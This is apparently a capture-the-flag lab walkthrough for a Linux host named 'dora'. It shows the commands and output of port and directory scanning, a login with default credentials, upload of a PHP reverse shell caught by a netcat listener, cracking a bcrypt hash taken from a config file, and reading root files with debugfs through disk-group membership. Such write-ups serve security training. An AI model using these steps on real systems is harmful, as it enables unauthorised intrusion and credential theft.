

## Lab Details
- Difficulty: Intermediate
- OS: Linux
- Foothold time: 30 minutes
- Laterial Movement: 50 minutes 
- Privesc time: 5 minutes 
- Total solve time: 1 hour and 25 minutes 

## Summary
- Initial access: Reverse shell obtained via file upload in `Extplorer` on port 80
- Lateral Movement: Found user credential in config file on local file system
- Privilege escalation: Privilege escalation via the `Disk` group

## Enumeration
- Key findings: Found `filemanager` endpoint 
##### Steps
- run `nmap`
```
 nmap 192.168.57.16 -p- -sC -A                
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-31 22:43 +0000
Nmap scan report for 192.168.57.16
Host is up (0.00053s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router|firewall
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (91%), IPFire 2.X (90%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3.10 cpe:/o:ipfire:ipfire:2.27 cpe:/o:linux:linux_kernel:6.1
Aggressive OS guesses: Linux 4.19 - 5.15 (97%), Linux 4.15 - 5.19 (91%), Linux 4.19 (91%), Linux 5.0 - 5.14 (91%), OpenWrt 21.02 (Linux 5.4) (91%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%), Linux 2.6.32 (90%), Linux 2.6.32 or 3.10 (90%), Linux 4.0 - 4.4 (90%), Linux 4.15 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   0.21 ms 192.168.49.1
2   0.34 ms 192.168.57.16

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 214.29 seconds

```
- run `feroxbuster`
```
$ feroxbuster -u http://192.168.57.16 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
                                                                                                          
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ?                 ver: 2.13.1
??????????????????????????????????????????????????
 ?  Target Url            ? http://192.168.57.16/
 ?  In-Scope Url          ? 192.168.57.16
 ?  Threads               ? 50
 ?  Wordlist              ? /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
 ?  Status Codes          ? All Status Codes!
 ?  Timeout (secs)        ? 7
 ?  User-Agent            ? feroxbuster/2.13.1
 ?  Config File           ? /etc/feroxbuster/ferox-config.toml
 ?  Extract Links         ? true
 ?  HTTP methods          ? [GET]
 ?  Recursion Depth       ? 4
??????????????????????????????????????????????????
 ?  Press [ENTER] to use the Scan Management Menu?
??????????????????????????????????????????????????
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      320c http://192.168.57.16/wp-includes => http://192.168.57.16/wp-includes/
302      GET        0l        0w        0c http://192.168.57.16/ => http://192.168.57.16/wp-admin/setup-config.php
301      GET        9l       28w      318c http://192.168.57.16/wordpress => http://192.168.57.16/wordpress/
301      GET        9l       28w      319c http://192.168.57.16/wp-content => http://192.168.57.16/wp-content/
301      GET        9l       28w      320c http://192.168.57.16/filemanager => http://192.168.57.16/filemanager/

```
- visit the `filemananger` endpoint, `extplorer` login page is prensened 
![[Pasted image 20260401072202.png]]
- login with default credential `admin : admin`


## Foothold
- Path: Reverse shell via file upload 
- Key commands: Download the reverse shell php file from `https://pentestmonkey.net/tools/web-shells/php-reverse-shell`
##### Steps 
- go to the `wp-admin` directory and click on the upload button 
- then upload the php reverse shell to the file system
![[Pasted image 20260401170259.png]]
- visit the upload reverse shell at http://192.168.235.16/wp-admin/php-reverse-shell.php
- receive reverse shell on local listener
```
$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.227] from (UNKNOWN) [192.168.235.16] 33078
Linux dora 5.4.0-146-generic #163-Ubuntu SMP Fri Mar 17 18:26:02 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 07:46:16 up  1:52,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Lateral Movement 
- Path: Credential harvest and discovery 
- Key commands: `grep` and `hashcat`
##### Steps 
- search the file system for users using `grep`
```
grep -rI --color=always -i "www-data@dora:/var/www/html/filemanager$ grep -rI --color=always -i "dora" .
./config/.htusers.php:  array('dora','$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS','/var/www/html','http://localhost','1','','0',1)," .
```
- found password hash for user `dora`
- recovered the plaintext using `hashcat`
```

$ hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
<SNIP>
$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS:doraemon
```
## Privilege Escalation
- Path: Privilege escalation via `Disk group`
- Key commands: `df` and `debugfs`

##### Steps
- first check the file system name 
```
dora@dora:~$ df /
Filesystem                        1K-blocks    Used Available Use% Mounted on
/dev/mapper/ubuntu--vg-ubuntu--lv  10218772 5284832   4393268  55% /

```
- then attempt to debug it using `debugfs`
```
dora@dora:~$ debugfs /dev/mapper/ubuntu--vg-ubuntu--l
debugfs 1.45.5 (07-Jan-2020)
debugfs: No such file or directory while trying to open /dev/mapper/ubuntu--vg-ubuntu--l
```
- error unable to find the file system directory 
```
dora@dora:/dev/mapper$ ls -la
total 0
drwxr-xr-x  2 root root      80 Feb 20  2025 .
drwxr-xr-x 18 root root    4060 Feb 20  2025 ..
crw-------  1 root root 10, 236 Feb 20  2025 control
lrwxrwxrwx  1 root root       7 Feb 20  2025 ubuntu--vg-ubuntu--lv -> ../dm-0
dora@dora:/dev/mapper$ ls ../
agpgart          loop5         tty0   tty4       ttyS11     userio
autofs           loop6         tty1   tty40      ttyS12     vcs
block            loop7         tty10  tty41      ttyS13     vcs1
bsg              loop-control  tty11  tty42      ttyS14     vcs2
btrfs-control    mapper        tty12  tty43      ttyS15     vcs3
cdrom            mcelog        tty13  tty44      ttyS16     vcs4
cdrw             mem           tty14  tty45      ttyS17     vcs5
char             mqueue        tty15  tty46      ttyS18     vcs6
console          net           tty16  tty47      ttyS19     vcsa
core             null          tty17  tty48      ttyS2      vcsa1
cpu              nvram         tty18  tty49      ttyS20     vcsa2
cpu_dma_latency  port          tty19  tty5       ttyS21     vcsa3
cuse             ppp           tty2   tty50      ttyS22     vcsa4
disk             psaux         tty20  tty51      ttyS23     vcsa5
dm-0
```
- enumerate the `/dev/mapper` directory and found the target directory is mapped to `/dev/dm-0`
- using `debugfs` to access the root directory 
```
dora@dora:/dev/mapper$ debugfs /dev/dm-0
debugfs 1.45.5 (07-Jan-2020)
debugfs:  cat /root/proof.txt
54386de4d9b941b46a3a58980d8bd184
```
## Lessons Learned
- Attack family: Web attack -> Directory Enumeration -> Credential Harvest -> Privilege Escalation via Group permission
- Key takeaway:
	- Carefully check enumeration output from `ffuf/feroxbuster` ensure endpoints are covered
	- Enumerate the file system and search for keywords like `pass` or usernames
## Resources
- References: